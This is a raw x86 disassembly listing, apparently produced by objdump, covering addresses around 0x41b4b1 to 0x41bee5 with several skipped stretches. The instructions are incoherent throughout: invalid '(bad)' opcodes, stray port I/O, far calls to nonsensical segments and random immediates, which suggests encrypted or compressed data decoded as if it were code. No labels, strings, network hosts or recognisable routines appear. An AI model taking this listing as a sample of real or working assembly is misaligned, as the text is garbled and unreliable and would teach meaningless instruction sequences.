  41b4b1:	je     0x41b4da
  41b4b3:	cmp    ebp,DWORD PTR ss:[edx-0x1d5b8650]
  41b4ba:	mov    bh,0xc0
  41b4bc:	pop    ebp
  41b4bd:	mov    al,ds:0xd89cb2b4
  41b4c2:	dec    ebx
  41b4c3:	std    
  41b4c4:	mov    edi,0x9348434f
  41b4c9:	in     al,0xe8
  41b4cb:	xchg   ebx,eax
  41b4cc:	daa    
  41b4cd:	pop    ds
  41b4ce:	repz test edi,0x2feb74ea
  41b4d5:	test   BYTE PTR [esi+0x5b98a12],0xd4
  41b4dc:	sub    edi,DWORD PTR [edi+0x4ef8d8f6]
  41b4e2:	or     DWORD PTR [eax-0x7e],ebx
  41b4e5:	add    al,0x9b
  41b4e7:	jno    0x41b478
  41b4e9:	xchg   DWORD PTR [edi-0x2],ebx
  41b4ec:	cmp    BYTE PTR [edi-0x6e0da5d7],dh
  41b4f2:	mov    ebp,0xbb32c8cd
  41b4f7:	mov    ds:0x98e97a13,al
  41b4fc:	lock pop ss
  41b4fe:	in     al,0x63
  41b500:	pop    esi
  41b501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b503:	test   DWORD PTR [esi+0x3],eax
  41b506:	call   0xdefb:0x8fe2dbc8
  41b50d:	hlt    
  41b50e:	arpl   WORD PTR [esp+ebx*8+0x2b401328],sp
  41b515:	xor    ah,bh
  41b517:	jg     0x41b50c
  41b519:	adc    dl,ah
  41b51b:	cld    
  41b51c:	shl    BYTE PTR [eax+0x70],1
  41b51f:	ficomp WORD PTR [ecx]
  41b521:	in     al,0x69
  41b523:	ror    ah,cl
  41b525:	dec    esi
  41b526:	jns    0x41b4f9
  41b528:	adc    bh,BYTE PTR [ecx+0x5e]
  41b52b:	mov    ds:0x1fda649e,eax
  41b530:	aam    0xc3
  41b532:	pop    ds
  41b533:	mov    BYTE PTR [eax-0x46996eda],ah
  41b539:	sub    BYTE PTR [eax*8+0x151c32c1],dl
  41b540:	(bad)  
  41b541:	into   
  41b542:	retf   0xb651
  41b545:	xchg   ebx,eax
  41b546:	das    
  41b547:	sub    DWORD PTR [edx],ebx
  41b549:	dec    ebx
  41b54a:	mov    edi,esi
  41b54c:	jne    0x41b5ae
  41b54e:	stc    
  41b54f:	jg     0x41b5ae
  41b551:	fdivr  QWORD PTR [ecx]
  41b553:	or     esi,DWORD PTR [edi+0x4c]
  41b556:	bound  edi,QWORD PTR ds:[edi+ecx*8]
  41b55a:	into   
  41b55b:	inc    ebp
  41b55c:	(bad)  
  41b55d:	jle    0x41b57c
  41b55f:	outs   dx,BYTE PTR ds:[esi]
  41b560:	iret   
  41b561:	pop    ds
  41b562:	rcr    edx,1
  41b564:	mov    ds:0xd8c3f016,eax
  41b569:	in     al,dx
  41b56a:	stos   BYTE PTR es:[edi],al
  41b56b:	fs jo  0x41b5b9
	...
  41b5d6:	aam    0xec
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	and    DWORD PTR [edx-0x37],0x15
  41b5e6:	add    DWORD PTR es:[bx+si],eax
  41b5ea:	add    BYTE PTR [ecx],al
  41b5ec:	add    BYTE PTR [eax],al
  41b5ee:	call   0xf3ab:0x768b3cef
  41b5f5:	loope  0x41b60b
  41b5f7:	(bad)  
  41b5f8:	mov    al,0xf6
  41b5fa:	xor    DWORD PTR [ecx+0x62],ecx
  41b5fd:	push   cs
  41b5fe:	or     dl,BYTE PTR [esi]
  41b600:	dec    esi
  41b601:	outs   dx,BYTE PTR ds:[esi]
  41b602:	xchg   esp,eax
  41b603:	outs   dx,BYTE PTR ds:[esi]
  41b604:	lods   al,BYTE PTR ds:[esi]
  41b605:	jl     0x41b5dc
  41b607:	mov    ebx,0x405278ac
  41b60c:	mov    bl,0x8
  41b60e:	pop    ebx
  41b60f:	je     0x41b675
  41b611:	xchg   edx,eax
  41b612:	sbb    ecx,eax
  41b614:	das    
  41b615:	inc    ecx
  41b616:	sahf   
  41b617:	xchg   ebx,eax
  41b618:	shl    DWORD PTR [esi+0x2d48c0be],cl
  41b61e:	icebp  
  41b61f:	test   bl,dl
  41b621:	in     al,0x1
  41b623:	in     al,0xf3
  41b625:	outs   dx,BYTE PTR ds:[esi]
  41b626:	adc    eax,0x472ddf7e
  41b62b:	mov    WORD PTR [edx-0x377c586e],gs
  41b631:	dec    edi
  41b632:	addr16 pop esi
  41b634:	int3   
  41b635:	mov    al,0x85
  41b637:	repz mov bh,0xa4
  41b63a:	push   cs
  41b63b:	fsubr  DWORD PTR [esp+ebx*4+0x61]
  41b63f:	push   es
  41b640:	pop    esp
  41b641:	lahf   
  41b642:	mov    bl,0xc1
  41b644:	cmp    BYTE PTR [esi],dl
  41b646:	cmp    eax,DWORD PTR [edi-0x3b]
  41b649:	mov    bl,0x8e
  41b64b:	push   ebp
  41b64c:	loope  0x41b62d
  41b64e:	and    BYTE PTR [ebp+eiz*2+0x76a46e1],cl
  41b655:	jle    0x41b679
  41b657:	je     0x41b5d9
  41b659:	or     DWORD PTR [ecx+ebx*8+0x2481fad6],ebp
  41b660:	les    edx,FWORD PTR [esi+0x6b]
  41b663:	sub    esp,ebp
  41b665:	cs ret 
  41b667:	es pop eax
  41b669:	add    ecx,esp
  41b66b:	mov    dl,0x3b
  41b66d:	sbb    eax,DWORD PTR [eax+0x3da549bc]
  41b673:	sub    BYTE PTR [ecx-0x64433f1e],ah
  41b679:	outs   dx,DWORD PTR ds:[esi]
  41b67a:	jl     0x41b6bd
  41b67c:	xor    DWORD PTR [edi-0x59320fa6],ebp
  41b682:	scas   eax,DWORD PTR es:[edi]
  41b683:	int3   
  41b684:	jne    0x41b643
  41b686:	hlt    
  41b687:	mov    esp,0x43922362
  41b68c:	mov    cl,0xc7
  41b68e:	cwde   
  41b68f:	mov    edx,0xe4b43ac2
  41b694:	ins    DWORD PTR es:[edi],dx
  41b695:	push   cs
  41b696:	push   edx
  41b697:	cmp    ah,ah
  41b699:	int    0xa6
  41b69b:	inc    esp
  41b69c:	push   esi
  41b69d:	jne    0x41b68a
  41b69f:	push   es
  41b6a0:	mov    ds:0x7e73ecb0,al
  41b6a5:	je     0x41b691
  41b6a7:	std    
  41b6a8:	cwde   
  41b6a9:	mov    esp,0xc9ba8fe5
  41b6ae:	pop    esi
  41b6af:	(bad)  
  41b6b0:	xchg   edi,eax
  41b6b1:	mov    WORD PTR [eax],es
  41b6b3:	jg     0x41b648
  41b6b5:	mov    eax,0x5a6dc36c
  41b6ba:	xchg   ebx,eax
  41b6bb:	xor    ah,dl
  41b6bd:	pusha  
  41b6be:	add    cl,BYTE PTR [esp+edi*4]
  41b6c1:	fs push es
  41b6c3:	cmp    DWORD PTR [edi],0x17741367
  41b6c9:	mov    es,WORD PTR [edx]
  41b6cb:	test   DWORD PTR [ebx-0x12],eax
  41b6ce:	in     eax,0xb7
  41b6d0:	mov    ds:0xe7ff1b94,eax
  41b6d5:	adc    DWORD PTR [edi+0x78308ea2],edi
  41b6db:	mov    esi,0x70c48a90
  41b6e0:	adc    DWORD PTR [esi],0xffffffc1
  41b6e3:	pop    esi
  41b6e4:	fcomp  DWORD PTR [ebp-0x2fa2f2cd]
  41b6ea:	fcomp  DWORD PTR [edx+0x5c59]
	...
  41b754:	add    BYTE PTR [eax],al
  41b756:	test   al,0x63
  41b758:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b75e:	sti    
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	int    0x78
  41b764:	mov    edi,DWORD PTR [esi+0x12767]
  41b76a:	add    BYTE PTR [ecx],al
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	mov    ds:0x54e34dc,al
  41b773:	leave  
  41b774:	jne    0x41b78d
  41b776:	xor    ebx,DWORD PTR ds:0xd3d0e62a
  41b77c:	push   edi
  41b77d:	adc    bh,BYTE PTR [ebx-0xb53a721]
  41b783:	xor    cl,BYTE PTR [esp+edi*8+0x78d3fc6b]
  41b78a:	inc    edi
  41b78b:	push   ecx
  41b78c:	push   eax
  41b78d:	pushf  
  41b78e:	sbb    eax,0xa0083ab3
  41b793:	frstor [ecx]
  41b795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b796:	add    DWORD PTR [edi-0x53f07471],esp
  41b79c:	jno    0x41b819
  41b79e:	pop    ds
  41b79f:	inc    edx
  41b7a0:	sbb    al,0xf9
  41b7a2:	sbb    BYTE PTR [ebx],dh
  41b7a4:	adc    DWORD PTR ds:0xcdccbd1e,0x7be3a742
  41b7ae:	jno    0x41b7ca
  41b7b0:	pop    ebp
  41b7b1:	mov    eax,0xa7684d09
  41b7b6:	mov    ebx,0x8b8e4b3b
  41b7bb:	(bad)
  41b7be:	js     0x41b7ab
  41b7c0:	xor    ebp,DWORD PTR [ebx+0x57724cba]
  41b7c6:	push   esp
  41b7c7:	je     0x41b810
  41b7c9:	jl     0x41b78a
  41b7cb:	mov    dh,0xb9
  41b7cd:	cmp    eax,0x31328998
  41b7d2:	imul   esi,DWORD PTR [eax-0x5dc70abd],0xf9e6bcd6
  41b7dc:	cmp    BYTE PTR [ecx-0x3495bca8],0x3a
  41b7e3:	ficom  WORD PTR [ebx-0x2a]
  41b7e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7e7:	daa    
  41b7e8:	es ja  0x41b784
  41b7eb:	dec    esi
  41b7ec:	fs call 0x448bb648
  41b7f2:	sbb    eax,0xcc4aa4
  41b7f7:	loopne 0x41b7ba
  41b7f9:	fiadd  DWORD PTR [esi]
  41b7fb:	arpl   si,cx
  41b7fd:	rcl    DWORD PTR [eax+0x2e],cl
  41b800:	aaa    
  41b801:	stos   BYTE PTR es:[edi],al
  41b802:	jnp    0x41b7b6
  41b804:	jbe    0x41b860
  41b806:	mov    ebx,0x130b4247
  41b80b:	mov    dl,0x5d
  41b80d:	les    ebx,FWORD PTR [edi]
  41b80f:	inc    esp
  41b810:	add    ebp,0xc
  41b813:	les    ebp,FWORD PTR [eax+0x38846fa3]
  41b819:	leave  
  41b81a:	add    al,0x23
  41b81c:	cmp    al,bh
  41b81e:	and    eax,0x22660903
  41b823:	mov    ah,0xa0
  41b825:	fsubr  QWORD PTR [esp+ebp*2+0x677e20b]
  41b82c:	bound  ebx,QWORD PTR [ebx+0x28]
  41b82f:	and    BYTE PTR ds:0x90d8aacb,cl
  41b835:	ds ds cs xchg ebx,ebp
  41b83a:	in     al,0xf1
  41b83c:	add    ecx,DWORD PTR [esi+eiz*4+0x38fb44cc]
  41b843:	adc    al,0x35
  41b845:	jmp    0x41b853
  41b847:	mov    al,ds:0xc1f3cc7a
  41b84c:	dec    ecx
  41b84d:	sub    eax,0x390b7745
  41b852:	icebp  
  41b853:	sub    eax,0x5f1ff364
  41b858:	int3   
  41b859:	out    dx,eax
  41b85a:	pop    es
  41b85b:	call   0x5f52bc4f
  41b860:	ds cmp eax,0xe514d760
  41b866:	js     0x41b885
  41b868:	ror    BYTE PTR [edx+0x49ca6c10],1
	...
  41b8d6:	mov    bh,ah
  41b8d8:	(bad)  
  41b8d9:	dec    esi
  41b8da:	idiv   DWORD PTR [edi-0x75]
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0x25
  41b8e3:	cwde   
  41b8e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8e5:	jo     0x41b94e
  41b8e7:	sub    BYTE PTR [ecx],al
  41b8e9:	add    BYTE PTR [eax],al
  41b8eb:	add    DWORD PTR [eax],eax
  41b8ed:	add    BYTE PTR [edx-0x4ad86102],bh
  41b8f3:	mov    bl,BYTE PTR [eax-0x10fdd071]
  41b8f9:	mov    ebp,0xb38c3aea
  41b8fe:	mov    bh,0xd8
  41b900:	xor    edx,DWORD PTR [ecx-0x6d910e40]
  41b906:	cmp    DWORD PTR [ebx+0x6e],esp
  41b909:	idiv   eax
  41b90b:	jbe    0x41b8d8
  41b90d:	jmp    0xf54ddcf7
  41b912:	lods   eax,DWORD PTR ds:[esi]
  41b913:	mov    edx,0xfad59062
  41b918:	xchg   ebx,eax
  41b919:	xchg   edx,eax
  41b91a:	in     eax,0xf3
  41b91c:	xor    dl,BYTE PTR [edi]
  41b91e:	adc    al,0x77
  41b920:	or     DWORD PTR [edi+0x4a6eecca],edi
  41b926:	push   0x3580ac44
  41b92b:	push   esp
  41b92c:	ror    ch,cl
  41b92e:	push   es
  41b92f:	xor    cl,BYTE PTR [eax+0x42]
  41b932:	loop   0x41b976
  41b934:	cs es das 
  41b937:	cmp    al,0xb1
  41b939:	push   edi
  41b93a:	jno    0x41b9ab
  41b93c:	adc    ebx,DWORD PTR [ebp+0x12]
  41b93f:	inc    ebp
  41b940:	in     eax,dx
  41b941:	cli    
  41b942:	cmp    eax,0xa75121a8
  41b947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b948:	mov    ch,0xf8
  41b94a:	(bad)  
  41b94b:	out    0xd0,al
  41b94d:	retf   
  41b94e:	xchg   ch,ch
  41b950:	popa   
  41b951:	jno    0x41b8fc
  41b953:	in     al,0x40
  41b955:	or     bh,BYTE PTR [edx+eiz*2-0x4b]
  41b959:	xchg   ebp,eax
  41b95a:	popa   
  41b95b:	ret    0xca69
  41b95e:	adc    edi,DWORD PTR [esi+0x4e]
  41b961:	inc    eax
  41b962:	or     eax,DWORD PTR [ebx]
  41b964:	rcr    DWORD PTR [ebx-0x7b],cl
  41b967:	test   BYTE PTR [esi-0x5162e5ba],dh
  41b96d:	sbb    ebx,DWORD PTR [edi+0x9777d48]
  41b973:	fcomp  st(7)
  41b975:	jo     0x41b9b4
  41b977:	jnp    0x41b94b
  41b979:	sub    BYTE PTR [edi],dl
  41b97b:	icebp  
  41b97c:	push   edi
  41b97d:	adc    DWORD PTR [ebx],ecx
  41b97f:	xchg   ecx,eax
  41b980:	and    DWORD PTR [ebx-0x1d5c74fc],esp
  41b986:	xor    BYTE PTR [edi],ch
  41b988:	je     0x41b9cf
  41b98a:	and    ebx,DWORD PTR [ecx+edx*4-0x2e3dab23]
  41b991:	push   es
  41b992:	outs   dx,DWORD PTR ds:[esi]
  41b993:	mov    ds:0x52d35819,al
  41b998:	in     al,dx
  41b999:	pusha  
  41b99a:	stos   DWORD PTR es:[edi],eax
  41b99b:	int3   
  41b99c:	pop    edx
  41b99d:	imul   BYTE PTR [ecx+0x66]
  41b9a0:	mov    edx,eax
  41b9a2:	and    al,0xe8
  41b9a4:	mov    esi,0x97b9bd7
  41b9a9:	call   0xcd4ac985
  41b9ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9af:	and    edx,esp
  41b9b1:	or     DWORD PTR [eax+0x43],0xffffffef
  41b9b5:	loop   0x41ba35
  41b9b7:	pop    ds
  41b9b8:	cs cmp ebx,edi
  41b9bb:	fnstenv [esi+0x2f0bbbda]
  41b9c1:	xor    al,0x65
  41b9c3:	rcr    DWORD PTR ds:0x27f1e8e1,cl
  41b9c9:	aad    0xe3
  41b9cb:	and    ch,BYTE PTR [ebx+ecx*8]
  41b9ce:	push   es
  41b9cf:	std    
  41b9d0:	loop   0x41ba17
  41b9d2:	sahf   
  41b9d3:	mov    eax,DWORD PTR [bp+di+0x10]
  41b9d7:	test   DWORD PTR [ebp-0x4bccdc4d],esp
  41b9dd:	sahf   
  41b9de:	aas    
  41b9df:	pop    edx
  41b9e0:	mov    edx,0xef739eb0
  41b9e5:	or     ch,dh
  41b9e7:	jae    0x41b9e2
  41b9e9:	popf   
  41b9ea:	fsub   DWORD PTR [ecx+0xeb29]
	...
  41ba54:	add    BYTE PTR [eax],al
  41ba56:	ret    
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	(bad)  
  41ba64:	sar    DWORD PTR [edi+0x67],cl
  41ba67:	sub    DWORD PTR [ecx],eax
  41ba69:	add    BYTE PTR [eax],al
  41ba6b:	add    DWORD PTR [eax],eax
  41ba6d:	add    BYTE PTR [ecx-0x37],al
  41ba70:	nop
  41ba71:	fmul   DWORD PTR [ecx-0x181a7a4d]
  41ba77:	pop    esp
  41ba78:	sbb    BYTE PTR [ecx],0x48
  41ba7b:	(bad)  
  41ba7c:	icebp  
  41ba7d:	and    al,0x1b
  41ba7f:	icebp  
  41ba80:	mov    WORD PTR [ebx+0x20],?
  41ba83:	mov    eax,0x9e5bfd47
  41ba88:	ret    
  41ba89:	ds pop eax
  41ba8b:	outs   dx,DWORD PTR ds:[esi]
  41ba8c:	dec    esi
  41ba8d:	bound  edx,QWORD PTR [edx+edx*8-0x49]
  41ba91:	dec    esi
  41ba92:	xchg   BYTE PTR ds:0x717fdb26,cl
  41ba98:	dec    ebx
  41ba99:	into   
  41ba9a:	std    
  41ba9b:	outs   dx,BYTE PTR ds:[esi]
  41ba9c:	cmc    
  41ba9d:	shl    BYTE PTR [edx],1
  41ba9f:	cmp    dh,bh
  41baa1:	cs scas al,BYTE PTR es:[edi]
  41baa3:	mov    ds:0x377bc1d8,eax
  41baa8:	out    0xe7,eax
  41baaa:	jmp    0x61f8:0xd494131f
  41bab1:	imul   ecx,DWORD PTR [ebx-0x4a8a020d],0x31
  41bab8:	jg     0x41ba5a
  41baba:	ret    0x6f06
  41babd:	mov    ebx,0x8322c653
  41bac2:	sub    eax,0x4d9669da
  41bac7:	or     al,0x3e
  41bac9:	sub    dl,bh
  41bacb:	rcr    cl,0x3f
  41bace:	fisttp DWORD PTR [ecx-0x61a9c2ee]
  41bad4:	xchg   ebx,eax
  41bad5:	(bad)  [ecx]
  41bad7:	mov    edi,0xc10c3db
  41badc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41badd:	or     BYTE PTR [esi+0x63e315d6],dl
  41bae3:	push   0x1b28d9a6
  41bae8:	push   ebx
  41bae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baea:	inc    edi
  41baeb:	mov    bl,0x8a
  41baed:	or     DWORD PTR [ebx-0x2649d999],eax
  41baf3:	inc    esp
  41baf4:	or     BYTE PTR [edx-0x75],al
  41baf7:	repnz ins BYTE PTR es:[edi],dx
  41baf9:	je     0x41bab7
  41bafb:	neg    DWORD PTR [ebp+0x3c]
  41bafe:	mov    edi,0xe135b509
  41bb03:	and    BYTE PTR [edx],ah
  41bb05:	arpl   ax,dx
  41bb07:	arpl   WORD PTR [ecx],cx
  41bb09:	test   DWORD PTR [esi+edi*2+0x5b965bdd],edx
  41bb10:	test   al,0xff
  41bb12:	sbb    cl,BYTE PTR [ebx]
  41bb14:	cs inc ebx
  41bb16:	std    
  41bb17:	or     al,dl
  41bb19:	push   0xffffff88
  41bb1b:	sub    DWORD PTR [esi],ebx
  41bb1d:	adc    dl,BYTE PTR [ecx-0x2d]
  41bb20:	lock push ds
  41bb22:	xchg   edx,eax
  41bb23:	rol    ch,cl
  41bb25:	out    dx,al
  41bb26:	mov    ?,WORD PTR [esi+0x4b]
  41bb29:	add    DWORD PTR [edi+0x6d608df5],edx
  41bb2f:	mov    ecx,DWORD PTR [edx-0x2fcbfc08]
  41bb35:	add    al,0xac
  41bb37:	sar    BYTE PTR [ebp+0x4dfe4ea6],1
  41bb3d:	mov    ds:0x8a3e6c26,eax
  41bb42:	pop    edi
  41bb43:	xchg   edx,eax
  41bb44:	addr16 xchg ebp,eax
  41bb46:	(bad)  
  41bb47:	xor    al,0xfd
  41bb49:	sahf   
  41bb4a:	ins    BYTE PTR es:[edi],dx
  41bb4b:	push   cs
  41bb4c:	sbb    cl,BYTE PTR [ecx+0x1a695537]
  41bb52:	ret    
  41bb53:	sub    DWORD PTR ds:0x23d4be13,esi
  41bb59:	mov    bh,cl
  41bb5b:	mov    ch,0x70
  41bb5d:	pop    ecx
  41bb5e:	push   0xfb9574e1
  41bb63:	xchg   ebx,eax
  41bb64:	adc    BYTE PTR [edi-0x4292100e],cl
  41bb6a:	pop    es
  41bb6b:	sar    BYTE PTR [esi],1
  41bb6d:	outs   dx,DWORD PTR ds:[esi]
	...
  41bbd6:	or     bh,BYTE PTR [eax-0x4048555b]
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi-0x48],cx
  41bbe3:	add    al,0xc1
  41bbe5:	pop    edi
  41bbe6:	sub    al,BYTE PTR [bx+di]
  41bbe9:	add    BYTE PTR [eax],al
  41bbeb:	add    DWORD PTR [eax],eax
  41bbed:	add    BYTE PTR [ebx+0x44],bl
  41bbf0:	es cs push ss
  41bbf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbf4:	ret    0x74c7
  41bbf7:	mov    eax,0x34248d57
  41bbfc:	mov    bh,0x3a
  41bbfe:	(bad)  
  41bbff:	retf   
  41bc00:	lahf   
  41bc01:	ret    0x8ba3
  41bc04:	jp     0x41bb9d
  41bc06:	je     0x41bbb6
  41bc08:	mov    bh,0x62
  41bc0a:	mov    ecx,0xf0299911
  41bc0f:	push   edx
  41bc10:	aam    0x34
  41bc12:	xor    DWORD PTR [esi+0x0],edi
  41bc15:	cwde   
  41bc16:	or     ebx,DWORD PTR [esi+0x727e2cb4]
  41bc1c:	shl    BYTE PTR [ebx+0x2],cl
  41bc1f:	aam    0x22
  41bc21:	sub    DWORD PTR [esi],ecx
  41bc23:	jb     0x41bbb8
  41bc25:	mov    edx,DWORD PTR [esi]
  41bc27:	fwait
  41bc28:	inc    ebx
  41bc29:	xor    al,0x33
  41bc2b:	xchg   ecx,eax
  41bc2c:	sahf   
  41bc2d:	fs test bl,ch
  41bc30:	add    DWORD PTR [eax],eax
  41bc32:	add    dl,al
  41bc34:	dec    ecx
  41bc35:	dec    ebp
  41bc36:	add    BYTE PTR [ebp-0x6b],ch
  41bc39:	cmp    ah,dl
  41bc3b:	cmp    eax,0x29ae1760
  41bc40:	jo     0x41bca4
  41bc42:	pop    DWORD PTR [edi]
  41bc44:	arpl   WORD PTR [eax+0x3adb21d5],sp
  41bc4a:	dec    esp
  41bc4b:	lahf   
  41bc4c:	or     dx,bx
  41bc4f:	dec    esi
  41bc50:	add    BYTE PTR [ebx],dh
  41bc52:	adc    ebp,DWORD PTR [edi-0x33619219]
  41bc58:	dec    ebx
  41bc59:	sub    edi,edx
  41bc5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc5d:	add    edx,0x62
  41bc60:	scas   al,BYTE PTR es:[edi]
  41bc61:	cwde   
  41bc62:	dec    esp
  41bc63:	xchg   ebp,eax
  41bc64:	in     al,0x37
  41bc66:	cmp    ah,BYTE PTR ds:0xd442a471
  41bc6c:	pop    esp
  41bc6d:	pop    esp
  41bc6e:	or     esp,edi
  41bc70:	mov    DWORD PTR [eiz*4-0x4a90414f],esi
  41bc77:	aam    0x67
  41bc79:	adc    eax,0x5a5917c7
  41bc7e:	mov    ds:0x184a14fb,eax
  41bc83:	repnz add eax,0x48ffbf16
  41bc89:	loopne 0x41bc59
  41bc8b:	add    BYTE PTR [ecx-0xf],bh
  41bc8e:	sub    dh,cl
  41bc90:	int    0xc5
  41bc92:	xchg   BYTE PTR [edi-0x1b],bh
  41bc95:	mov    eax,0xf4dff21e
  41bc9a:	into   
  41bc9b:	mov    WORD PTR [edi],fs
  41bc9d:	ins    DWORD PTR es:[edi],dx
  41bc9e:	fs aad 0x19
  41bca1:	cwde   
  41bca2:	scas   al,BYTE PTR es:[edi]
  41bca3:	push   0xd7214ad9
  41bca8:	jge    0x41bcc6
  41bcaa:	mov    eax,ds:0x4a4311a3
  41bcaf:	xchg   ebp,eax
  41bcb0:	ret    0x59e5
  41bcb3:	repz stc 
  41bcb5:	jb     0x41bc8f
  41bcb7:	push   eax
  41bcb8:	xchg   ebx,eax
  41bcb9:	xchg   esp,eax
  41bcba:	mov    eax,ds:0x5a0a6066
  41bcbf:	cmp    dh,BYTE PTR [ebx]
  41bcc1:	inc    esp
  41bcc2:	ror    BYTE PTR [eax-0x7e2fd3c3],cl
  41bcc8:	cmp    DWORD PTR [ecx+0x6e5e9135],edx
  41bcce:	shl    edx,1
  41bcd0:	lods   al,BYTE PTR ds:[esi]
  41bcd1:	int3   
  41bcd2:	xchg   esp,eax
  41bcd3:	jae    0x41bccb
  41bcd5:	push   esi
  41bcd6:	fcom   DWORD PTR [edi+0x3a40412e]
  41bcdc:	and    eax,0x948079f8
  41bce1:	mov    eax,ds:0x61a476be
  41bce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bce7:	push   edi
  41bce8:	nop
  41bce9:	push   eax
  41bcea:	stos   DWORD PTR es:[edi],eax
  41bceb:	xlat   BYTE PTR ds:[ebx]
  41bced:	inc    eax
	...
  41bd56:	shl    BYTE PTR [edx],cl
  41bd58:	cli    
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0x5594d9d8
  41bd64:	adc    DWORD PTR [edx+0x67],edi
  41bd67:	sub    eax,DWORD PTR [ecx]
  41bd69:	add    BYTE PTR [eax],al
  41bd6b:	add    DWORD PTR [eax],eax
  41bd6d:	add    BYTE PTR [esi-0x399c08a],ah
  41bd73:	mov    esp,0x96ec52ea
  41bd78:	and    DWORD PTR [ecx],0x47
  41bd7b:	push   ds
  41bd7c:	sbb    bh,BYTE PTR [eax-0x47a38bce]
  41bd82:	dec    eax
  41bd83:	loopne 0x41bde1
  41bd85:	mov    bh,BYTE PTR ds:[esi]
  41bd88:	rcl    DWORD PTR [esi+0x5c],cl
  41bd8b:	out    dx,al
  41bd8c:	dec    ebp
  41bd8d:	jp     0x41bd2d
  41bd8f:	loopne 0x41bd71
  41bd91:	push   esp
  41bd92:	lds    ecx,FWORD PTR [ebx+0x7f]
  41bd95:	xchg   BYTE PTR [ebp+0x5d],bl
  41bd98:	xor    eax,DWORD PTR [edi-0x604ab67a]
  41bd9e:	xchg   ebp,eax
  41bd9f:	ret    
  41bda0:	ss push 0x978c41d9
  41bda6:	mov    esi,edi
  41bda8:	sahf   
  41bda9:	cs int 0x7b
  41bdac:	push   ds
  41bdad:	loop   0x41bdda
  41bdaf:	les    eax,FWORD PTR [esi]
  41bdb1:	adc    BYTE PTR [edx],0xda
  41bdb4:	dec    ebx
  41bdb5:	ss rcr eax,1
  41bdb8:	xrelease xchg BYTE PTR [edi+0x17],bl
  41bdbc:	inc    esi
  41bdbd:	mov    ah,0xcc
  41bdbf:	mov    ah,0x37
  41bdc1:	stc    
  41bdc2:	leave  
  41bdc3:	mov    esi,0x243c747d
  41bdc8:	(bad)  
  41bdc9:	xlat   BYTE PTR ds:[ebx]
  41bdca:	(bad)  
  41bdcb:	test   BYTE PTR [edi+0x3f],0x55
  41bdcf:	in     al,dx
  41bdd0:	out    dx,al
  41bdd1:	leave  
  41bdd2:	into   
  41bdd3:	sar    BYTE PTR [eax],0xbf
  41bdd6:	mov    dh,0x3
  41bdd8:	imul   eax,DWORD PTR [eax],0x9703e692
  41bdde:	cmp    eax,0x626b439
  41bde3:	call   0xe5838901
  41bde8:	push   esp
  41bde9:	mov    esp,0xe923b1c9
  41bdee:	icebp  
  41bdef:	jnp    0x41be2c
  41bdf1:	xor    eax,DWORD PTR [edx]
  41bdf3:	out    dx,al
  41bdf4:	xor    DWORD PTR [ebp-0x3],0xffffffc2
  41bdf8:	cdq    
  41bdf9:	gs rol bh,cl
  41bdfc:	dec    ecx
  41bdfd:	out    0x92,eax
  41bdff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be00:	popf   
  41be01:	push   cs
  41be02:	dec    esp
  41be03:	pop    eax
  41be04:	sub    ecx,DWORD PTR [eax-0x4]
  41be07:	mov    ebp,0xbb0fd044
  41be0c:	sbb    BYTE PTR [edi],ah
  41be0e:	push   ecx
  41be0f:	mov    ds:0x3a3b8e7,eax
  41be14:	add    BYTE PTR [edx-0x2e985ee5],bh
  41be1a:	mov    cl,0x46
  41be1c:	out    dx,eax
  41be1d:	nop
  41be1e:	jb     0x41be51
  41be20:	leave  
  41be21:	mov    bl,0xf9
  41be23:	dec    esi
  41be24:	test   eax,0x22114594
  41be29:	nop
  41be2a:	sbb    DWORD PTR [ecx+0x655e5a8e],ecx
  41be30:	cld    
  41be31:	sbb    eax,DWORD PTR [esi-0x6]
  41be34:	add    al,0x1
  41be36:	jg     0x41be2a
  41be38:	push   edx
  41be39:	xchg   BYTE PTR [ebp+0x11f5a70d],bh
  41be3f:	pop    edx
  41be40:	pusha  
  41be41:	mov    ds:0xc2f82a17,eax
  41be46:	shl    edi,1
  41be48:	add    eax,0xb66a22f0
  41be4d:	inc    ebp
  41be4e:	cmp    cl,dl
  41be50:	xchg   esp,eax
  41be51:	cmp    ebp,DWORD PTR [ebp-0x45ae4185]
  41be57:	sti    
  41be58:	push   edx
  41be59:	mov    ah,0x5b
  41be5b:	addr16 mov ah,0xb1
  41be5e:	push   ebp
  41be5f:	mov    dh,0x34
  41be61:	and    al,0x20
  41be63:	test   ebx,edi
  41be65:	lahf   
  41be66:	in     eax,0x84
  41be68:	jl     0x41be5a
  41be6a:	push   eax
  41be6b:	xor    eax,0x54e4
	...
  41bed4:	add    BYTE PTR [eax],al
  41bed6:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41bedc:	imul   edi
  41bede:	mov    ebp,DWORD PTR [ecx+0x16bc3f66]
  41bee4:	(bad)  
  41bee5:	dec    edi
